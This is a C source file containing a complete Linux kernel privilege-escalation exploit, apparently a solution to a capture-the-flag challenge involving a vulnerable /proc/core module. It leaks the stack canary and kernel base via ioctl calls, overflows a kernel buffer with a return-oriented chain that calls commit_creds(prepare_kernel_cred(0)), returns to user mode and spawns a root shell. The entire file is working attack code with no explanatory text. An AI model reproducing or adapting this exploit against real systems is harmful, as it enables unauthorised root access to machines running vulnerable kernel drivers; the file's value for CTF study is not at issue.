
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

int fd=-1;

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;

unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}
void getshell(){
    system("/bin/sh");
}
void getroot(){
    commit_creds(prepare_kernel_cred(0));
}
void core_read(char* buf){
    ioctl(fd,0x6677889B,buf);
}
void core_copy(unsigned long long len){
    ioctl(fd,0x6677889A,len);
}
void set_off(unsigned long long off){
    ioctl(fd,0x6677889C,off);
}

void main(){
    fd=open("/proc/core",O_RDWR);
    unsigned long long buf[0x40/8]={0};
    unsigned long long canary=0;
    save_stats();
    commit_creds = 0x9c8e0;
    prepare_kernel_cred = 0x9cce0;
    unsigned long long vmlinux_base = 0;
    unsigned long long mod_base=0;
    
    set_off(0x40);
    core_read(buf);
    
    canary = buf[0];
    mod_base = buf[2]-0x19b;
    vmlinux_base = buf[4]-0x1dd6d1;
    printf("canary= %p\n",canary);
    printf("mod_base= %p\n",mod_base);
    printf("vmlinux_base= %p\n",vmlinux_base);
    commit_creds+=vmlinux_base;
    prepare_kernel_cred+=vmlinux_base;
    
    unsigned long long p_rdi = 0xb2f+vmlinux_base;
    unsigned long long p_rdx = 0xa0f49+vmlinux_base;
    unsigned long long p_rsi = 0x11d6+vmlinux_base;
    unsigned long long mov_rdi_rax_jmp_rdx = 0x6a6d2+vmlinux_base;
    unsigned long long swapgs = 0xa012da+vmlinux_base;
    unsigned long long iretq = 0x50ac2+vmlinux_base;
    unsigned long long rop[20]={0};
    int i=0;
    rop[i++]=canary;
    rop[i++]=0;//rbp
    rop[i++]=p_rdi;
    rop[i++]=0;
    rop[i++]=prepare_kernel_cred;
    rop[i++]=p_rdx;
    rop[i++]=commit_creds;
    rop[i++]=mov_rdi_rax_jmp_rdx;
    rop[i++]=swapgs;
    rop[i++]=0;
    rop[i++]=iretq;
    rop[i++]=getshell;
    rop[i++]=user_cs;
    rop[i++]=user_eflags;
    rop[i++]=user_sp;
    rop[i++]=user_ss;
    
    char payload[0x100]={0};
    memset(payload,'A',0x40);
    memcpy(payload+0x40,rop,sizeof(rop));
    write(fd,payload,sizeof(payload));
    core_copy(0xf000000000000100);
    
    return 0;
}

